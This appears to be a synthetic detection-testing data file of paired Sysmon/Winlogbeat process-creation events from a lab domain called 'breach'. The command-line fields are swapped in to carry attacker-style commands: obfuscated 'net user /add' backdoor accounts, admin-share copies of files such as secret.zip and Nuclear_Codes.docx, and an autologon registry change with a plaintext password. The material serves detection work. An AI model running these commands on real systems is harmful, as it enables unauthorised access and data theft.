"{'task': 'Process Create (rule: ProcessCreate)', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_data': {'Product': 'Winlogbeat', 'TerminalSessionId': '1', 'LogonId': '0x25612', 'Description': 'Winlogbeat ships Windows event logs to Elasticsearch or Logstash.', 'LogonGuid': '{19FC45AC-53AD-601C-0000-002012560200}', 'Company': 'Elastic', 'FileVersion': '7.10.2', 'OriginalFileName': 'winlogbeat.exe', 'IntegrityLevel': 'High'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'version': 5, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'opcode': 'Info', 'process': {'pid': 1524, 'thread': {'id': 1780}}, 'record_id': 1134, 'api': 'wineventlog', 'computer_name': 'CLIENT', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'}","{'opcode': 'Info', 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1524, 'thread': {'id': 1780}}, 'event_data': {'TerminalSessionId': '0', 'OriginalFileName': 'sdclt.exe', 'IntegrityLevel': 'System', 'Description': 'Microsoft® Windows Backup', 'LogonId': '0x3e5', 'LogonGuid': '{19FC45AC-4599-601C-0000-0020E5030000}', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation'}, 'api': 'wineventlog', 'event_id': 1, 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1111, 'computer_name': 'CLIENT', 'task': 'Process Create (rule: ProcessCreate)'}"
"{'created': '2021-02-04T20:32:30.139Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:30:49.649Z', 'kind': 'event', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}"
"{'working_directory': 'C:\\Program Files\\Winlogbeat\\', 'parent': {'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" ', 'name': 'powershell.exe', 'args': ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'], 'entity_id': '{19FC45AC-5508-601C-0000-001011C60B00}', 'pid': 3988, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}, 'name': 'winlogbeat.exe', 'args': ['C:\\Program Files\\Winlogbeat\\winlogbeat.exe', 'setup', '--index-management'], 'hash': {'md5': '0d17999868f2768b1b050cb051884110', 'sha256': 'e72f5dba2a177397403965a3352f0cc45ec46a568a53d5ef4535fbba18e73023'}, 'entity_id': '{19FC45AC-59DB-601C-0000-00102ED80F00}', 'pid': 3028, 'executable': 'C:\\Windows\\System32\\net1.exe', 'command_line': 'C:\\Windows\\System32\\net1 user /add srvcusr usrpsswrd'}","{'args': ['C:\\Windows\\System32\\sdclt.exe', '/CONFIGNOTIFICATION'], 'pid': 1688, 'working_directory': 'C:\\Windows\\system32\\', 'command_line': 'net u""""s""e""r /add mynewusr secretpasswd123', 'parent': {'entity_id': '{19FC45AC-4598-601C-0000-00100D610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'sdclt.exe', 'hash': {'md5': '5efdbeaecd69e250e5ba4a2950203cd4', 'sha256': 'f66cedb142fb711b9a9e57eff498df0bbca16419ee089ab35529fae4e6a19e7e'}, 'entity_id': '{19FC45AC-54D5-601C-0000-0010809A0A00}', 'executable': 'C:\\Windows\\System32\\net.exe'}"
"{'domain': 'client', 'name': 'breach'}","{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}"
"{'md5': '0d17999868f2768b1b050cb051884110', 'sha256': 'e72f5dba2a177397403965a3352f0cc45ec46a568a53d5ef4535fbba18e73023'}","{'md5': '5efdbeaecd69e250e5ba4a2950203cd4', 'sha256': 'f66cedb142fb711b9a9e57eff498df0bbca16419ee089ab35529fae4e6a19e7e'}"
2021-02-05T01:02:00.517Z,2021-02-04T22:27:19.640Z
"Process Create:
RuleName: 
UtcTime: 2021-02-05 01:02:00.517
ProcessGuid: {19FC45AC-9908-601C-0000-0010B85D1B00}
ProcessId: 1668
Image: C:\Windows\System32\Macromed\Flash\FlashPlayerUpdateService.exe
FileVersion: 18,0,0,194
Description: Adobe® Flash® Player Update Service 18.0 r0
Product: Adobe® Flash® Player Update Service
Company: Adobe Systems Incorporated
OriginalFileName: ?
CommandLine: C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76E7-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=1234A12B71DAE034E45C714AE5A54412,SHA256=079E6BC834F38322ED5ED76295EC3961ED894084EF5CB171DFFBD9B3822CC78D
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:19.640
ProcessGuid: {19FC45AC-74C7-601C-0000-0010DB1E0100}
ProcessId: 1328
Image: C:\Windows\System32\userinit.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Userinit Logon Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: USERINIT.EXE
CommandLine: C:\Windows\system32\userinit.exe
CurrentDirectory: C:\Windows\system32\
User: client\setup
LogonGuid: {19FC45AC-74C6-601C-0000-002031010100}
LogonId: 0x10131
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B
ParentProcessGuid: {19FC45AC-74C3-601C-0000-0010355C0000}
ParentProcessId: 384
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe"
"{'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'event_data': {'FileVersion': '18,0,0,194', 'OriginalFileName': '?', 'LogonGuid': '{19FC45AC-76E7-601C-0000-0020E7030000}', 'Company': 'Adobe Systems Incorporated', 'Product': 'Adobe® Flash® Player Update Service', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Description': 'Adobe® Flash® Player Update Service 18.0 r0', 'TerminalSessionId': '0'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'record_id': 1563, 'computer_name': 'CLIENT3.breach.local', 'process': {'thread': {'id': 308}, 'pid': 1904}, 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}}","{'event_data': {'TerminalSessionId': '1', 'IntegrityLevel': 'High', 'OriginalFileName': 'USERINIT.EXE', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'LogonGuid': '{19FC45AC-74C6-601C-0000-002031010100}', 'Description': 'Userinit Logon Application', 'LogonId': '0x10131', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'event_id': 1, 'opcode': 'Info', 'api': 'wineventlog', 'computer_name': 'CLIENT', 'process': {'pid': 1692, 'thread': {'id': 1064}}, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'record_id': 1169, 'task': 'Process Create (rule: ProcessCreate)'}"
"{'entity_id': '{19FC45AC-9908-601C-0000-0010B85D1B00}', 'pid': 1668, 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe', 'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}","{'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\^c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'args': ['C:\\Windows\\system32\\userinit.exe'], 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'executable': 'C:\\Windows\\System32\\userinit.exe', 'pid': 1328, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe'], 'entity_id': '{19FC45AC-74C3-601C-0000-0010355C0000}'}, 'name': 'userinit.exe', 'entity_id': '{19FC45AC-74C7-601C-0000-0010DB1E0100}'}"
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'domain': 'client', 'name': 'setup'}"
"{'user': 'SYSTEM', 'hash': ['1234a12b71dae034e45c714ae5a54412', '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d']}","{'user': 'setup', 'hash': ['61ac3efdfacfdd3f0f11dd4fd4044223', '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b']}"
"{'created': '2021-02-05T01:02:01.817Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'category': ['process'], 'created': '2021-02-04T22:31:13.041Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'module': 'sysmon', 'type': ['start', 'process_start']}"
"{'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'name': 'CLIENT3.breach.local', 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT'}"
"{'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}","{'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}"
"{'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}"
2021-02-05T01:02:00.517Z,2021-02-04T22:29:08.404Z
"Process Create:
RuleName: 
UtcTime: 2021-02-05 01:02:00.517
ProcessGuid: {19FC45AC-9908-601C-0000-0010B85D1B00}
ProcessId: 1668
Image: C:\Windows\System32\Macromed\Flash\FlashPlayerUpdateService.exe
FileVersion: 18,0,0,194
Description: Adobe® Flash® Player Update Service 18.0 r0
Product: Adobe® Flash® Player Update Service
Company: Adobe Systems Incorporated
OriginalFileName: ?
CommandLine: C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76E7-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=1234A12B71DAE034E45C714AE5A54412,SHA256=079E6BC834F38322ED5ED76295EC3961ED894084EF5CB171DFFBD9B3822CC78D
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:08.404
ProcessGuid: {19FC45AC-7534-601C-0000-00105F910200}
ProcessId: 2144
Image: C:\Program Files\NetTime\NetTime.exe
FileVersion: 3.1.4.220
Description: Network Time Synchronizer
Product: NetTime
Company: 
OriginalFileName: NetTime.exe
CommandLine: ""C:\Program Files\NetTime\NetTime.exe"" 
CurrentDirectory: C:\Windows\system32\
User: BREACH\client1
LogonGuid: {19FC45AC-7533-601C-0000-0020ED4A0200}
LogonId: 0x24aed
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=60B65F97C12BA30CD36450D376227C02,SHA256=D06598F2F203CEC7A7A3857F727BC2BA457C1C0CEF2787B90CE553407FBF8536
ParentProcessGuid: {19FC45AC-7533-601C-0000-0010825E0200}
ParentProcessId: 1516
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
"{'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'event_data': {'FileVersion': '18,0,0,194', 'OriginalFileName': '?', 'LogonGuid': '{19FC45AC-76E7-601C-0000-0020E7030000}', 'Company': 'Adobe Systems Incorporated', 'Product': 'Adobe® Flash® Player Update Service', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Description': 'Adobe® Flash® Player Update Service 18.0 r0', 'TerminalSessionId': '0'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'record_id': 1563, 'computer_name': 'CLIENT3.breach.local', 'process': {'thread': {'id': 308}, 'pid': 1904}, 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}}","{'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1296, 'opcode': 'Info', 'api': 'wineventlog', 'version': 5, 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_data': {'TerminalSessionId': '1', 'FileVersion': '3.1.4.220', 'IntegrityLevel': 'Medium', 'LogonId': '0x24aed', 'Description': 'Network Time Synchronizer', 'Product': 'NetTime', 'LogonGuid': '{19FC45AC-7533-601C-0000-0020ED4A0200}', 'OriginalFileName': 'NetTime.exe'}, 'event_id': 1, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT1.breach.local'}"
"{'entity_id': '{19FC45AC-9908-601C-0000-0010B85D1B00}', 'pid': 1668, 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe', 'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}","{'parent': {'entity_id': '{19FC45AC-7533-601C-0000-0010825E0200}', 'pid': 1516, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE']}, 'args': ['C:\\Program Files\\NetTime\\NetTime.exe'], 'entity_id': '{19FC45AC-7534-601C-0000-00105F910200}', 'working_directory': 'C:\\Windows\\system32\\', 'command_line': 'C:\\Windows\\System32\\cmd.exe /c ""copy"" \\\\server123\\C$\\Users\\john\\Downloads\\Nuclear_Codes.docx C:\\', 'name': 'NetTime.exe', 'hash': {'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536', 'md5': '60b65f97c12ba30cd36450d376227c02'}, 'pid': 2144, 'executable': 'C:\\Program Files\\NetTime\\NetTime.exe'}"
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'domain': 'BREACH', 'name': 'client1'}"
"{'user': 'SYSTEM', 'hash': ['1234a12b71dae034e45c714ae5a54412', '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d']}","{'user': 'client1', 'hash': ['60b65f97c12ba30cd36450d376227c02', 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536']}"
"{'created': '2021-02-05T01:02:01.817Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'created': '2021-02-04T22:31:06.299Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}"
"{'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'name': 'CLIENT3.breach.local', 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT1.breach.local', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101']}"
"{'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}","{'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}"
"{'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5'}"
2021-02-05T01:02:00.517Z,2021-02-04T22:28:18.640Z
"Process Create:
RuleName: 
UtcTime: 2021-02-05 01:02:00.517
ProcessGuid: {19FC45AC-9908-601C-0000-0010B85D1B00}
ProcessId: 1668
Image: C:\Windows\System32\Macromed\Flash\FlashPlayerUpdateService.exe
FileVersion: 18,0,0,194
Description: Adobe® Flash® Player Update Service 18.0 r0
Product: Adobe® Flash® Player Update Service
Company: Adobe Systems Incorporated
OriginalFileName: ?
CommandLine: C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76E7-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=1234A12B71DAE034E45C714AE5A54412,SHA256=079E6BC834F38322ED5ED76295EC3961ED894084EF5CB171DFFBD9B3822CC78D
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:18.640
ProcessGuid: {19FC45AC-7502-601C-0000-00105DC40200}
ProcessId: 2284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell ""$reg_path = 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'""
CurrentDirectory: C:\BREACH\
User: CLIENT1\setup
LogonGuid: {19FC45AC-7500-601C-0000-0020BA3C0200}
LogonId: 0x23cba
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE
ParentProcessGuid: {19FC45AC-7501-601C-0000-0010A4A70200}
ParentProcessId: 2204
ParentImage: C:\Program Files\Python35-32\python.exe
ParentCommandLine: ""C:\Program Files\Python35-32\python.exe"" ""C:\BREACH\init_tbf_client.py"" "
"{'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'event_data': {'FileVersion': '18,0,0,194', 'OriginalFileName': '?', 'LogonGuid': '{19FC45AC-76E7-601C-0000-0020E7030000}', 'Company': 'Adobe Systems Incorporated', 'Product': 'Adobe® Flash® Player Update Service', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Description': 'Adobe® Flash® Player Update Service 18.0 r0', 'TerminalSessionId': '0'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'record_id': 1563, 'computer_name': 'CLIENT3.breach.local', 'process': {'thread': {'id': 308}, 'pid': 1904}, 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}}","{'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1504, 'thread': {'id': 1772}}, 'event_data': {'FileVersion': '10.0.14409.1005 (rs1_srvoob.161208-1155)', 'OriginalFileName': 'PowerShell.EXE', 'Product': 'Microsoft® Windows® Operating System', 'LogonGuid': '{19FC45AC-7500-601C-0000-0020BA3C0200}', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'High', 'TerminalSessionId': '1', 'Description': 'Windows PowerShell', 'LogonId': '0x23cba'}, 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'api': 'wineventlog', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'computer_name': 'CLIENT1', 'opcode': 'Info', 'event_id': 1, 'record_id': 1239}"
"{'entity_id': '{19FC45AC-9908-601C-0000-0010B85D1B00}', 'pid': 1668, 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe', 'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}","{'args': ['powershell', ""$reg_path = 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'""], 'hash': {'sha256': '70ba57fb0bf2f34b86426d21559f5f6d05c1268193904de8e959d7b06ce964ce', 'md5': 'eb32c070e658937aa9fa9f3ae629b2b8'}, 'entity_id': '{19FC45AC-7502-601C-0000-00105DC40200}', 'parent': {'command_line': '""C:\\Program Files\\Python35-32\\python.exe"" ""C:\\BREACH\\init_tbf_client.py"" ', 'name': 'python.exe', 'args': ['C:\\Program Files\\Python35-32\\python.exe', 'C:\\BREACH\\init_tbf_client.py'], 'entity_id': '{19FC45AC-7501-601C-0000-0010A4A70200}', 'pid': 2204, 'executable': 'C:\\Program Files\\Python35-32\\python.exe'}, 'command_line': 'cmd /c copy \\\\192.168.0.23\\admi""""$\\write.exe C:\\Users\\ADMINI~1\\AppData\\Local\\Temp', 'working_directory': 'C:\\BREACH\\', 'name': 'powershell.exe', 'pid': 2284, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}"
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'domain': 'CLIENT1', 'name': 'setup'}"
"{'user': 'SYSTEM', 'hash': ['1234a12b71dae034e45c714ae5a54412', '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d']}","{'hash': ['eb32c070e658937aa9fa9f3ae629b2b8', '70ba57fb0bf2f34b86426d21559f5f6d05c1268193904de8e959d7b06ce964ce'], 'user': 'setup'}"
"{'created': '2021-02-05T01:02:01.817Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.132Z', 'kind': 'event'}"
